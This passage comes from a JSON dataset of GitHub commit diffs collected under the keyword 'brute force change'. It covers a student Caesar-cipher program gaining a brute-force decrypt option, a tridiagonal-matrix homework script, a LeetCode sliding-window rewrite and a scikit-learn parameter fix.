again...\")\n+\n+\n mainMenu()\n try_again = input(\"\\nTry again? y\/n: \").lower()\n \n while try_again == 'y':\n     mainMenu()\n-    try_again = input(\"\\nTry again? y\/n: \").lower()\n-\n+    try_again = input(\"\\nTry again? y\/n: \").lower()\n\\ No newline at end of file\n","files":{"\/main.py":{"changes":[{"diff":"\n         print(\"\"\"=== Caesar Cipher Program by Group 2 AN41 ===\n             1 - Encryption\n             2 - Decryption\n-            3 - Brute Force (No key needed)\n+            3 - Decrypt using Brute Force (No key needed)\n             4 - Exit Program\"\"\")\n \n         choice = int(input(\"What would you like to do?: \"))\n","add":1,"remove":1,"filename":"\/main.py","badparts":["            3 - Brute Force (No key needed)"],"goodparts":["            3 - Decrypt using Brute Force (No key needed)"]},{"diff":"\n         elif choice == 2:\n             decMenu()\n         elif choice == 3:\n-            'BLANK MUNA'\n+            bfMenu()\n         elif choice == 4:\n             quit()\n         else:\n","add":1,"remove":1,"filename":"\/main.py","badparts":["            'BLANK MUNA'"],"goodparts":["            bfMenu()"]},{"diff":"\n         print(\"Invalid Input, try again...\")\n \n \n+def bfMenu():\n+    print(\"\"\"\\n=== Caesar Cipher: BRUTE FORCE ===\"\"\")\n+    print(\"Test all possible shift keys 26-letter alphabet A-Z\\n\")\n+    try:\n+        txt = input(\"Please enter the message you want to decrypt: \")\n+        bruteforce(txt)\n+    except:\n+        print(\"Invalid Input, try again...\")\n+\n+\n mainMenu()\n try_again = input(\"\\nTry again? y\/n: \").lower()\n \n while try_again == 'y':\n     mainMenu()\n-    try_again = input(\"\\nTry again? y\/n: \").lower()\n-\n+    try_again = input(\"\\nTry again? y\/n: \").lower()\n\\ No newline at end of file\n","add":11,"remove":2,"filename":"\/main.py","badparts":["    try_again = input(\"\\nTry again? y\/n: \").lower()"],"goodparts":["def bfMenu():","    print(\"\"\"\\n=== Caesar Cipher: BRUTE FORCE ===\"\"\")","    print(\"Test all possible shift keys 26-letter alphabet A-Z\\n\")","    try:","        txt = input(\"Please enter the message you want to decrypt: \")","        bruteforce(txt)","    except:","        print(\"Invalid Input, try again...\")","    try_again = input(\"\\nTry again? y\/n: \").lower()"]}],"source":"\nimport os import sys def encryption(text, key): result='' for i in range(len(text)): special=text[i] new_special=special.lower() if new_special==\" \": result +=' ' elif special.isalpha(): result +=chr((ord(new_special) +key -97) % 26 +97) return result.upper() def decryption(text, key): result='' for i in range(len(text)): special=text[i] new_special=special.lower() if new_special==\" \": result +=' ' elif special.isalpha(): result +=chr((ord(new_special) -key -97) % 26 +97) return result.upper() def mainMenu(): try: if sys.platform.startswith('win32'): os.system('cls') else: os.system('clear') print(\"\"\"===Caesar Cipher Program by Group 2 AN41=== 1 -Encryption 2 -Decryption 3 -Brute Force(No key needed) 4 -Exit Program\"\"\") choice=int(input(\"What would you like to do?: \")) if choice==1: encMenu() elif choice==2: decMenu() elif choice==3: 'BLANK MUNA' elif choice==4: quit() else: print(\"Invalid Choice...\") except: print('Invalid Input...') def encMenu(): print(\"\"\"\\n===Caesar Cipher: ENCRYPTION===\\n\"\"\") try: txt=input(\"Please enter the message you want to encrpyt: \") s=int(input(\"Please enter shift key: \")) print(\"Plain Text: \" +txt) print(\"Shift Key: \" +str(s)) ans=encryption(txt, s); print(\"Ciphertext: \" +ans) except: print(\"Invalid Input, try again...\") def decMenu(): print(\"\"\"\\n===Caesar Cipher: DECRYPTION===\\n\"\"\") try: txt=input(\"Please enter the message you want to decrypt: \") s=int(input(\"Please enter shift key: \")) print(\"Ciphertext: \" +txt) print(\"Shift Key: \" +str(s)) ans=decryption(txt, s); print(\"Plain Text: \" +ans) except: print(\"Invalid Input, try again...\") mainMenu() try_again=input(\"\\nTry again? y\/n: \").lower() while try_again=='y': mainMenu() try_again=input(\"\\nTry again? y\/n: \").lower() ","sourceWithComments":"import os\nimport sys\n\n\n# ENCRPYTION AND DECRYPTION FUNCTIONS\ndef encryption(text, key):\n    result = ''\n    for i in range(len(text)):\n        special = text[i]\n        new_special = special.lower()\n        if new_special == \" \":\n            result += ' '\n        elif special.isalpha():\n            result += chr((ord(new_special) + key - 97) % 26 + 97)\n\n    return result.upper()\n\n\ndef decryption(text, key):\n    result = ''\n    for i in range(len(text)):\n        special = text[i]\n        new_special = special.lower()\n        if new_special == \" \":\n            result += ' '\n        elif special.isalpha():\n            result += chr((ord(new_special) - key - 97) % 26 + 97)\n    return result.upper()\n\n\n# MENU FUNCTIONS\ndef mainMenu():\n    try:\n        if sys.platform.startswith('win32'):\n            os.system('cls')\n        else:\n            os.system('clear')\n\n        print(\"\"\"=== Caesar Cipher Program by Group 2 AN41 ===\n            1 - Encryption\n            2 - Decryption\n            3 - Brute Force (No key needed)\n            4 - Exit Program\"\"\")\n\n        choice = int(input(\"What would you like to do?: \"))\n        if choice == 1:\n            encMenu()\n        elif choice == 2:\n            decMenu()\n        elif choice == 3:\n            'BLANK MUNA'\n        elif choice == 4:\n            quit()\n        else:\n            print(\"Invalid Choice...\")\n    except:\n        print('Invalid Input...')\n\ndef encMenu():\n    print(\"\"\"\\n=== Caesar Cipher: ENCRYPTION ===\\n\"\"\")\n    try:\n        txt = input(\"Please enter the message you want to encrpyt: \")\n        s = int(input(\"Please enter shift key: \"))\n        print(\"Plain Text : \" + txt)\n        print(\"Shift Key: \" + str(s))\n        ans = encryption(txt, s);\n        print(\"Ciphertext: \" + ans)\n    except:\n        print(\"Invalid Input, try again...\")\n\ndef decMenu():\n    print(\"\"\"\\n=== Caesar Cipher: DECRYPTION ===\\n\"\"\")\n    try:\n        txt = input(\"Please enter the message you want to decrypt: \")\n        s = int(input(\"Please enter shift key: \"))\n        print(\"Ciphertext : \" + txt)\n        print(\"Shift Key: \" + str(s))\n        ans = decryption(txt, s);\n        print(\"Plain Text: \" + ans)\n    except:\n        print(\"Invalid Input, try again...\")\n\n\nmainMenu()\ntry_again = input(\"\\nTry again? y\/n: \").lower()\n\nwhile try_again == 'y':\n    mainMenu()\n    try_again = input(\"\\nTry again? y\/n: \").lower()\n\n"}},"msg":"changes and working na ung brute force"}},"https:\/\/github.com\/cphillips13\/MATH471":{"a0372471f639658b89c594b6836b6107b083a8c2":{"url":"https:\/\/api.github.com\/repos\/cphillips13\/MATH471\/commits\/a0372471f639658b89c594b6836b6107b083a8c2","html_url":"https:\/\/github.com\/cphillips13\/MATH471\/commit\/a0372471f639658b89c594b6836b6107b083a8c2","message":"changed a from brute force to diag","sha":"a0372471f639658b89c594b6836b6107b083a8c2","keyword":"brute force change","diff":"diff --git a\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py b\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py\nindex 3ecacfa..d27350e 100644\n--- a\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py\n+++ b\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py\n@@ -3,7 +3,7 @@\n import matplotlib.pyplot as plt\n \n import library\n-import libary.ch2lib.py as ch2\n+import library.ch2lib.py as ch2\n \n x0 = 0\n x1 = 5\ndiff --git a\/Boardwork\/CP_2.6.3.py b\/Boardwork\/CP_2.6.3.py\nindex fe4c428..5bdadb0 100644\n--- a\/Boardwork\/CP_2.6.3.py\n+++ b\/Boardwork\/CP_2.6.3.py\n@@ -28,29 +28,103 @@\n import numpy as np\n import math\n \n-matrixA = np.matrix([[6,1,0,0, np.pi\/9], [2,4,1,0, np.sqrt(3)\/2], [0,1,4,2, np.sqrt(3)\/2], [0,0,1,6, np.pi\/-9]])\n-shape = np.shape(matrixA)\n-\n def __checkSquare(matrixA, shape):\n-    if(shape[0] == shape[1]-1):\n-        print('matrixA is square! It is a ', shape[0],' by ', shape[1]-1 , ' matrix!')\n+    if(shape[0] == shape[1]):\n+        print('matrixA is square! It is a ', shape[0],' by ', shape[1], ' matrix!')\n         return True\n-    elif(shape[0] != shape[1]-1):\n+    elif(shape[0] != shape[1]):\n         print('matrixA is not square! It is a ', shape[0],' by ', shape[1], ' matrix!')\n         return False\n \n-def checkUpperCorner(matrixA, shape):\n-    x = __checkSquare(matrixA,shape)\n-    if(x == True):\n+def checkUpperCorner(matrixA, shape, isSquare):\n+    if(isSquare == True):\n+        for i in range(int(shape[0]\/2)):\n+            for j in range(int(shape[0]\/2)):\n+                if(i+j+2 < shape[0] and matrixA[i, j + i + 2] != 0):\n+                    return False\n+        return True\n+    else:\n+        return False\n+\n+def checkLowerCorner(matrixA, shape, isSquare):\n+    if(isSquare == True):\n         for i in range(int(shape[0]\/2)):\n             for j in range(int(shape[0]\/2)):\n-                print(matrixA[i, j + i + 2])\n-        print('yes')\n-        return 0\n-    elif(x == False):\n-        print('no')\n-        return 0\n-\n-checkUpperCorner(matrixA, shape)\n-#use np.matrix\n-#np.linalg.solve\n\\ No newline at end of file\n+                if(i+j+2 < shape[0] and matrixA[i+j+2, i] != 0):\n+                    return False\n+        return True\n+    else:\n+        return False\n+\n+def run(matrixA, shape, isSquare):\n+    if(isSquare == True):\n+        UC = checkUpperCorner(matrixA, shape, isSquare)\n+        LC = checkLowerCorner(matrixA, shape, isSquare)\n+        print(LC)\n+        print(UC)\n+        matrixACopy = np.copy(matrixA)\n+        x = 0\n+        for i in range(shape[0]-1):\n+            y = matrixACopy[i,x]\n+            x = x+1\n+            for j in range(shape[1]):\n+                if(matrixACopy[i,j] != 0):\n+                    matrixACopy[i+1,j] = matrixACopy[i+1,j] - matrixACopy[i,j]*(matrixACopy[i+1,j]\/y)\n+                    print(matrixACopy)\n+        return 1\n+\n+\n+    return 0 \n+\n+matrixA = np.matrix([[6,1,0,0], [2,4,1,0], [0,1,4,2], [0,0,1,6]])\n+solMatrixA = np.matrix([np.pi\/9,np.sqrt(3)\/2,np.sqrt(3)\/2,np.pi\/-9])\n+#matrixA = np.matrix([[6,1,0,0,0, np.pi\/9], [2,4,1,0,0, np.sqrt(3)\/2], [0,1,4,2,0, np.sqrt(3)\/2], [0,0,1,6,0, np.pi\/-9]])\n+diag2 = np.diagonal(matrixA,1,0,1)\n+diag3 = np.diagonal(matrixA,0,1,0)\n+print(diag2)\n+print(diag3)\n+\n+\n+shape = np.shape(matrixA)\n+isSquare = __checkSquare(matrixA, shape)\n+#run(matrixA, shape, isSquare)\n+\n+def checkEdge(matrixA, shape):\n+    for i in range(int(shape[0]\/2)):\n+        diag = np.diagonal(matrixA,i+2, 0, 1)\n+        diag2 = np.diagonal(matrixA,i+2, 1, 0)\n+        if(diag.any() or diag2.any() != 0):\n+            return False\n+    return True\n+\n+\"\"\"\n+|a c 0 |\n+|b a c | \n+|0 b a |\n+\n+|a c 0 0|\n+|b a c 0| \n+|0 b a c|\n+|0 0 b a| \n+\"\"\"\n+def arith(matrixA, shape):\n+    print(matrixA)\n+    diagA = np.diagonal(matrixA).copy\n+    diagB = np.diagonal(matrixA, 1, 1, 0).copy\n+    diagC = np.diagonal(matrixA, 1, 0, 1).copy\n+\n+    retMatrix = matrixA.copy\n+\n+    #pass right\n+    for i in range(int(shape[0]-1)):\n+        for j in range(int(shape[0]-1)):\n+            retMatrix[i+1][j] = retMatrix[i+1][j] - retMatrix[i][j]*(retMatrix[i+1][j]\/retMatrix[i][j])\n+\n+    print(retMatrix)\n+\n+\n+\n+\n+    return 0 \n+print(checkEdge(matrixA,shape))\n+arith(matrixA, shape)\n\\ No newline at end of file\n","files":{"\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py":{"changes":[{"diff":"\n import matplotlib.pyplot as plt\n \n import library\n-import libary.ch2lib.py as ch2\n+import library.ch2lib.py as ch2\n \n x0 = 0\n x1 = 5","add":1,"remove":1,"filename":"\/Boardwork\/CP_2.3Proof\/CP_2.3Proof.py","badparts":["import libary.ch2lib.py as ch2"],"goodparts":["import library.ch2lib.py as ch2"]}],"source":"\nimport numpy as np import math import matplotlib.pyplot as plt import library import libary.ch2lib.py as ch2 x0=0 x1=5 x=np.linspace(x0, x1, 200) y=abs(x**2 -x*x1 -x*x0 +x0*x1) fig, ax=plt.subplots() ax.plot(x, y) plt.axvline(x0+x1\/2, color='b', label='axvline -full height') plt.show() ch2.hello() ","sourceWithComments":"import numpy as np\nimport math\nimport matplotlib.pyplot as plt\n\nimport library\nimport libary.ch2lib.py as ch2\n\nx0 = 0\nx1 = 5\n\n\nx = np.linspace(x0, x1, 200)\ny = abs(x**2 - x*x1 - x*x0 + x0*x1)\n\nfig, ax = plt.subplots()\nax.plot(x, y)\n\nplt.axvline(x0+x1\/2, color = 'b', label = 'axvline - full height')\n\nplt.show()\n\n\nch2.hello()\n\n\n"},"\/Boardwork\/CP_2.6.3.py":{"changes":[{"diff":"\n import numpy as np\n import math\n \n-matrixA = np.matrix([[6,1,0,0, np.pi\/9], [2,4,1,0, np.sqrt(3)\/2], [0,1,4,2, np.sqrt(3)\/2], [0,0,1,6, np.pi\/-9]])\n-shape = np.shape(matrixA)\n-\n def __checkSquare(matrixA, shape):\n-    if(shape[0] == shape[1]-1):\n-        print('matrixA is square! It is a ', shape[0],' by ', shape[1]-1 , ' matrix!')\n+    if(shape[0] == shape[1]):\n+        print('matrixA is square! It is a ', shape[0],' by ', shape[1], ' matrix!')\n         return True\n-    elif(shape[0] != shape[1]-1):\n+    elif(shape[0] != shape[1]):\n         print('matrixA is not square! It is a ', shape[0],' by ', shape[1], ' matrix!')\n         return False\n \n-def checkUpperCorner(matrixA, shape):\n-    x = __checkSquare(matrixA,shape)\n-    if(x == True):\n+def checkUpperCorner(matrixA, shape, isSquare):\n+    if(isSquare == True):\n+        for i in range(int(shape[0]\/2)):\n+            for j in range(int(shape[0]\/2)):\n+                if(i+j+2 < shape[0] and matrixA[i, j + i + 2] != 0):\n+                    return False\n+        return True\n+    else:\n+        return False\n+\n+def checkLowerCorner(matrixA, shape, isSquare):\n+    if(isSquare == True):\n         for i in range(int(shape[0]\/2)):\n             for j in range(int(shape[0]\/2)):\n-                print(matrixA[i, j + i + 2])\n-        print('yes')\n-        return 0\n-    elif(x == False):\n-        print('no')\n-        return 0\n-\n-checkUpperCorner(matrixA, shape)\n-#use np.matrix\n-#np.linalg.solve\n\\ No newline at end of file\n+                if(i+j+2 < shape[0] and matrixA[i+j+2, i] != 0):\n+                    return False\n+        return True\n+    else:\n+        return False\n+\n+def run(matrixA, shape, isSquare):\n+    if(isSquare == True):\n+        UC = checkUpperCorner(matrixA, shape, isSquare)\n+        LC = checkLowerCorner(matrixA, shape, isSquare)\n+        print(LC)\n+        print(UC)\n+        matrixACopy = np.copy(matrixA)\n+        x = 0\n+        for i in range(shape[0]-1):\n+            y = matrixACopy[i,x]\n+            x = x+1\n+            for j in range(shape[1]):\n+                if(matrixACopy[i,j] != 0):\n+                    matrixACopy[i+1,j] = matrixACopy[i+1,j] - matrixACopy[i,j]*(matrixACopy[i+1,j]\/y)\n+                    print(matrixACopy)\n+        return 1\n+\n+\n+    return 0 \n+\n+matrixA = np.matrix([[6,1,0,0], [2,4,1,0], [0,1,4,2], [0,0,1,6]])\n+solMatrixA = np.matrix([np.pi\/9,np.sqrt(3)\/2,np.sqrt(3)\/2,np.pi\/-9])\n+#matrixA = np.matrix([[6,1,0,0,0, np.pi\/9], [2,4,1,0,0, np.sqrt(3)\/2], [0,1,4,2,0, np.sqrt(3)\/2], [0,0,1,6,0, np.pi\/-9]])\n+diag2 = np.diagonal(matrixA,1,0,1)\n+diag3 = np.diagonal(matrixA,0,1,0)\n+print(diag2)\n+print(diag3)\n+\n+\n+shape = np.shape(matrixA)\n+isSquare = __checkSquare(matrixA, shape)\n+#run(matrixA, shape, isSquare)\n+\n+def checkEdge(matrixA, shape):\n+    for i in range(int(shape[0]\/2)):\n+        diag = np.diagonal(matrixA,i+2, 0, 1)\n+        diag2 = np.diagonal(matrixA,i+2, 1, 0)\n+        if(diag.any() or diag2.any() != 0):\n+            return False\n+    return True\n+\n+\"\"\"\n+|a c 0 |\n+|b a c | \n+|0 b a |\n+\n+|a c 0 0|\n+|b a c 0| \n+|0 b a c|\n+|0 0 b a| \n+\"\"\"\n+def arith(matrixA, shape):\n+    print(matrixA)\n+    diagA = np.diagonal(matrixA).copy\n+    diagB = np.diagonal(matrixA, 1, 1, 0).copy\n+    diagC = np.diagonal(matrixA, 1, 0, 1).copy\n+\n+    retMatrix = matrixA.copy\n+\n+    #pass right\n+    for i in range(int(shape[0]-1)):\n+        for j in range(int(shape[0]-1)):\n+            retMatrix[i+1][j] = retMatrix[i+1][j] - retMatrix[i][j]*(retMatrix[i+1][j]\/retMatrix[i][j])\n+\n+    print(retMatrix)\n+\n+\n+\n+\n+    return 0 \n+print(checkEdge(matrixA,shape))\n+arith(matrixA, shape)\n\\ No newline at end of file\n","add":93,"remove":19,"filename":"\/Boardwork\/CP_2.6.3.py","badparts":["matrixA = np.matrix([[6,1,0,0, np.pi\/9], [2,4,1,0, np.sqrt(3)\/2], [0,1,4,2, np.sqrt(3)\/2], [0,0,1,6, np.pi\/-9]])","shape = np.shape(matrixA)","    if(shape[0] == shape[1]-1):","        print('matrixA is square! It is a ', shape[0],' by ', shape[1]-1 , ' matrix!')","    elif(shape[0] != shape[1]-1):","def checkUpperCorner(matrixA, shape):","    x = __checkSquare(matrixA,shape)","    if(x == True):","                print(matrixA[i, j + i + 2])","        print('yes')","        return 0","    elif(x == False):","        print('no')","        return 0","checkUpperCorner(matrixA, shape)"],"goodparts":["    if(shape[0] == shape[1]):","        print('matrixA is square! It is a ', shape[0],' by ', shape[1], ' matrix!')","    elif(shape[0] != shape[1]):","def checkUpperCorner(matrixA, shape, isSquare):","    if(isSquare == True):","        for i in range(int(shape[0]\/2)):","            for j in range(int(shape[0]\/2)):","                if(i+j+2 < shape[0] and matrixA[i, j + i + 2] != 0):","                    return False","        return True","    else:","        return False","def checkLowerCorner(matrixA, shape, isSquare):","    if(isSquare == True):","                if(i+j+2 < shape[0] and matrixA[i+j+2, i] != 0):","                    return False","        return True","    else:","        return False","def run(matrixA, shape, isSquare):","    if(isSquare == True):","        UC = checkUpperCorner(matrixA, shape, isSquare)","        LC = checkLowerCorner(matrixA, shape, isSquare)","        print(LC)","        print(UC)","        matrixACopy = np.copy(matrixA)","        x = 0","        for i in range(shape[0]-1):","            y = matrixACopy[i,x]","            x = x+1","            for j in range(shape[1]):","                if(matrixACopy[i,j] != 0):","                    matrixACopy[i+1,j] = matrixACopy[i+1,j] - matrixACopy[i,j]*(matrixACopy[i+1,j]\/y)","                    print(matrixACopy)","        return 1","    return 0 ","matrixA = np.matrix([[6,1,0,0], [2,4,1,0], [0,1,4,2], [0,0,1,6]])","solMatrixA = np.matrix([np.pi\/9,np.sqrt(3)\/2,np.sqrt(3)\/2,np.pi\/-9])","diag2 = np.diagonal(matrixA,1,0,1)","diag3 = np.diagonal(matrixA,0,1,0)","print(diag2)","print(diag3)","shape = np.shape(matrixA)","isSquare = __checkSquare(matrixA, shape)","def checkEdge(matrixA, shape):","    for i in range(int(shape[0]\/2)):","        diag = np.diagonal(matrixA,i+2, 0, 1)","        diag2 = np.diagonal(matrixA,i+2, 1, 0)","        if(diag.any() or diag2.any() != 0):","            return False","    return True","\"\"\"","|a c 0 |","|b a c | ","|0 b a |","|a c 0 0|","|b a c 0| ","|0 b a c|","|0 0 b a| ","\"\"\"","def arith(matrixA, shape):","    print(matrixA)","    diagA = np.diagonal(matrixA).copy","    diagB = np.diagonal(matrixA, 1, 1, 0).copy","    diagC = np.diagonal(matrixA, 1, 0, 1).copy","    retMatrix = matrixA.copy","    for i in range(int(shape[0]-1)):","        for j in range(int(shape[0]-1)):","            retMatrix[i+1][j] = retMatrix[i+1][j] - retMatrix[i][j]*(retMatrix[i+1][j]\/retMatrix[i][j])","    print(retMatrix)","    return 0 ","print(checkEdge(matrixA,shape))","arith(matrixA, shape)"]}],"source":"\n\"\"\" Corey Phillips Started 10\/27\/22 Last updated 10\/27\/22 Stored in MATH471 repo on github.com\/cphillips13 Question 2.6.3 & 2.6.4 Use Algorithm 2.6 to solve the following system of equations. |6 1 0 0| |x1| |pi\/9 | |2 4 1 0| |x2|=|sqrt(3)\/2| |0 1 4 2| |x3| |sqrt(3)\/2| |0 0 1 6| |x4| |-pi\/9 | You should get the solution x=(1,2,3,4)^T Algorithm 2.6: a11x1 +a12x2 +... +a1nxn=f1 a21x1 +a22x2 +... +a2nxn=f2 . . . . . . . . . an1x1 +an2x2 +... +annxn=fn \"\"\" import numpy as np import math matrixA=np.matrix([[6,1,0,0, np.pi\/9],[2,4,1,0, np.sqrt(3)\/2],[0,1,4,2, np.sqrt(3)\/2],[0,0,1,6, np.pi\/-9]]) shape=np.shape(matrixA) def __checkSquare(matrixA, shape): if(shape[0]==shape[1]-1): print('matrixA is square! It is a ', shape[0],' by ', shape[1]-1, ' matrix!') return True elif(shape[0] !=shape[1]-1): print('matrixA is not square! It is a ', shape[0],' by ', shape[1], ' matrix!') return False def checkUpperCorner(matrixA, shape): x=__checkSquare(matrixA,shape) if(x==True): for i in range(int(shape[0]\/2)): for j in range(int(shape[0]\/2)): print(matrixA[i, j +i +2]) print('yes') return 0 elif(x==False): print('no') return 0 checkUpperCorner(matrixA, shape) ","sourceWithComments":"\"\"\"\nCorey Phillips\nStarted 10\/27\/22\nLast updated 10\/27\/22\nStored in MATH471 repo on github.com\/cphillips13\n\nQuestion 2.6.3 & 2.6.4\nUse Algorithm 2.6 to solve the following system of equations.\n     \n|6 1 0 0| |x1|   |pi\/9     |\n|2 4 1 0| |x2| = |sqrt(3)\/2| \n|0 1 4 2| |x3|   |sqrt(3)\/2|\n|0 0 1 6| |x4|   |-pi\/9    |\n     \nYou should get the solution x = (1,2,3,4)^T\n\nAlgorithm 2.6:\n\na11x1 + a12x2 + ... + a1nxn = f1\na21x1 + a22x2 + ... + a2nxn = f2\n.                     .        .\n.                     .        .\n.                     .        .\nan1x1 + an2x2 + ... + annxn = fn\n\n\"\"\"\n\nimport numpy as np\nimport math\n\nmatrixA = np.matrix([[6,1,0,0, np.pi\/9], [2,4,1,0, np.sqrt(3)\/2], [0,1,4,2, np.sqrt(3)\/2], [0,0,1,6, np.pi\/-9]])\nshape = np.shape(matrixA)\n\ndef __checkSquare(matrixA, shape):\n    if(shape[0] == shape[1]-1):\n        print('matrixA is square! It is a ', shape[0],' by ', shape[1]-1 , ' matrix!')\n        return True\n    elif(shape[0] != shape[1]-1):\n        print('matrixA is not square! It is a ', shape[0],' by ', shape[1], ' matrix!')\n        return False\n\ndef checkUpperCorner(matrixA, shape):\n    x = __checkSquare(matrixA,shape)\n    if(x == True):\n        for i in range(int(shape[0]\/2)):\n            for j in range(int(shape[0]\/2)):\n                print(matrixA[i, j + i + 2])\n        print('yes')\n        return 0\n    elif(x == False):\n        print('no')\n        return 0\n\ncheckUpperCorner(matrixA, shape)\n#use np.matrix\n#np.linalg.solve"}},"msg":"changed a from brute force to diag"}},"https:\/\/github.com\/nellaG\/snippet":{"d0f7ebea9ef7eae3f53447d201528d10d713e4c5":{"url":"https:\/\/api.github.com\/repos\/nellaG\/snippet\/commits\/d0f7ebea9ef7eae3f53447d201528d10d713e4c5","html_url":"https:\/\/github.com\/nellaG\/snippet\/commit\/d0f7ebea9ef7eae3f53447d201528d10d713e4c5","message":"change brute force to sliding window","sha":"d0f7ebea9ef7eae3f53447d201528d10d713e4c5","keyword":"brute force change","diff":"diff --git a\/python\/ps\/longest_subst_wo_repeat.py b\/python\/ps\/longest_subst_wo_repeat.py\nindex 140a445..5ef4701 100644\n--- a\/python\/ps\/longest_subst_wo_repeat.py\n+++ b\/python\/ps\/longest_subst_wo_repeat.py\n@@ -1,16 +1,24 @@\n \"\"\" https:\/\/leetcode.com\/problems\/longest-substring-without-repeating-characters\/ \"\"\"\n \n+from collections import Counter\n+\n+\n class Solution:\n     def engthOfLongestSubstring(self, s: str) -> int:\n         length = len(s)\n         res = 0\n-        for i in range(length):\n-            for j in range(i, length):\n-                if self.is_unique(s[i:j + 1]):\n-                    res = max(res, j - i + 1)\n+        ch = Counter()\n+        lidx = ridx = 0\n \n-        return res\n+        while ridx < length:\n+            r = s[ridx]\n+            ch[r] += 1\n \n-    def is_unique(self, st):\n-        stlist = list(st)\n-        return list(set(stlist)) == stlist\n+            while ch[r] > 1:  # move window\n+                l = s[lidx]\n+                ch[l] -= 1\n+                lidx += 1\n+            res = max(res, ridx + 1 - lidx)\n+            ridx += 1\n+\n+        return res\n","files":{"\/python\/ps\/longest_subst_wo_repeat.py":{"changes":[{"diff":"\n \"\"\" https:\/\/leetcode.com\/problems\/longest-substring-without-repeating-characters\/ \"\"\"\n \n+from collections import Counter\n+\n+\n class Solution:\n     def engthOfLongestSubstring(self, s: str) -> int:\n         length = len(s)\n         res = 0\n-        for i in range(length):\n-            for j in range(i, length):\n-                if self.is_unique(s[i:j + 1]):\n-                    res = max(res, j - i + 1)\n+        ch = Counter()\n+        lidx = ridx = 0\n \n-        return res\n+        while ridx < length:\n+            r = s[ridx]\n+            ch[r] += 1\n \n-    def is_unique(self, st):\n-        stlist = list(st)\n-        return list(set(stlist)) == stlist\n+            while ch[r] > 1:  # move window\n+                l = s[lidx]\n+                ch[l] -= 1\n+                lidx += 1\n+            res = max(res, ridx + 1 - lidx)\n+            ridx += 1\n+\n+        return res\n","add":16,"remove":8,"filename":"\/python\/ps\/longest_subst_wo_repeat.py","badparts":["        for i in range(length):","            for j in range(i, length):","                if self.is_unique(s[i:j + 1]):","                    res = max(res, j - i + 1)","        return res","    def is_unique(self, st):","        stlist = list(st)","        return list(set(stlist)) == stlist"],"goodparts":["from collections import Counter","        ch = Counter()","        lidx = ridx = 0","        while ridx < length:","            r = s[ridx]","            ch[r] += 1","            while ch[r] > 1:  # move window","                l = s[lidx]","                ch[l] -= 1","                lidx += 1","            res = max(res, ridx + 1 - lidx)","            ridx += 1","        return res"]}],"source":"\n\"\"\" https:\/\/leetcode.com\/problems\/longest-substring-without-repeating-characters\/ \"\"\" class Solution: def engthOfLongestSubstring(self, s: str) -> int: length=len(s) res=0 for i in range(length): for j in range(i, length): if self.is_unique(s[i:j +1]): res=max(res, j -i +1) return res def is_unique(self, st): stlist=list(st) return list(set(stlist))==stlist ","sourceWithComments":"\"\"\" https:\/\/leetcode.com\/problems\/longest-substring-without-repeating-characters\/ \"\"\"\n\nclass Solution:\n    def engthOfLongestSubstring(self, s: str) -> int:\n        length = len(s)\n        res = 0\n        for i in range(length):\n            for j in range(i, length):\n                if self.is_unique(s[i:j + 1]):\n                    res = max(res, j - i + 1)\n\n        return res\n\n    def is_unique(self, st):\n        stlist = list(st)\n        return list(set(stlist)) == stlist\n"}},"msg":"change brute force to sliding window"}},"https:\/\/github.com\/kavyabhat02\/Book-Recommender":{"f04a9cc2b4a2e78475c87e44cbc10963e2162d37":{"url":"https:\/\/api.github.com\/repos\/kavyabhat02\/Book-Recommender\/commits\/f04a9cc2b4a2e78475c87e44cbc10963e2162d37","html_url":"https:\/\/github.com\/kavyabhat02\/Book-Recommender\/commit\/f04a9cc2b4a2e78475c87e44cbc10963e2162d37","message":"change brute_force to brute","sha":"f04a9cc2b4a2e78475c87e44cbc10963e2162d37","keyword":"brute force change","diff":"diff --git a\/web\/train_popular.py b\/web\/train_popular.py\nindex 2e5e6af..e7c0157 100644\n--- a\/web\/train_popular.py\n+++ b\/web\/train_popular.py\n@@ -28,7 +28,7 @@\n min_max_scaler = MinMaxScaler()\n features = min_max_scaler.fit_transform(features)\n \n-model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute_force')\n+model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute')\n model1.fit(features)\n dist1, idlist1 = model1.kneighbors(features)\n \n","files":{"\/web\/train_popular.py":{"changes":[{"diff":"\n min_max_scaler = MinMaxScaler()\n features = min_max_scaler.fit_transform(features)\n \n-model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute_force')\n+model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute')\n model1.fit(features)\n dist1, idlist1 = model1.kneighbors(features)\n \n","add":1,"remove":1,"filename":"\/web\/train_popular.py","badparts":["model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute_force')"],"goodparts":["model1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute')"]}],"source":"\n\nimport pickle import numpy as np import pandas as pd from sklearn.cluster import KMeans from sklearn import neighbors from sklearn.model_selection import train_test_split from sklearn.preprocessing import MinMaxScaler df=pd.read_csv('books.csv',error_bad_lines=False) df.head() df.fillna(0,inplace=True) df.isnull().sum() df2=df.copy() df2.loc[(df2['average_rating'] >=0) &(df2['average_rating'] <=1), 'rating_between']=\"between 0 and 1\" df2.loc[(df2['average_rating'] > 1) &(df2['average_rating'] <=2), 'rating_between']=\"between 1 and 2\" df2.loc[(df2['average_rating'] > 2) &(df2['average_rating'] <=3), 'rating_between']=\"between 2 and 3\" df2.loc[(df2['average_rating'] > 3) &(df2['average_rating'] <=4), 'rating_between']=\"between 3 and 4\" df2.loc[(df2['average_rating'] > 4) &(df2['average_rating'] <=5), 'rating_between']=\"between 4 and 5\" rating_df=pd.get_dummies(df2['rating_between']) features=pd.concat([rating_df, df2['average_rating'], df2['ratings_count']], axis=1) from sklearn.preprocessing import MinMaxScaler min_max_scaler=MinMaxScaler() features=min_max_scaler.fit_transform(features) model1=neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute_force') model1.fit(features) dist1, idlist1=model1.kneighbors(features) model2=neighbors.NearestNeighbors(n_neighbors=6, algorithm='ball_tree') model2.fit(features) dist2, idlist2=model2.kneighbors(features) model3=neighbors.NearestNeighbors(n_neighbors=6, algorithm='kd_tree') model3.fit(features) dist3, idlist3=model3.kneighbors(features) pickledDF=pickle.dumps(df2) pickledList1=pickle.dumps(idlist1) pickledList2=pickle.dumps(idlist2) 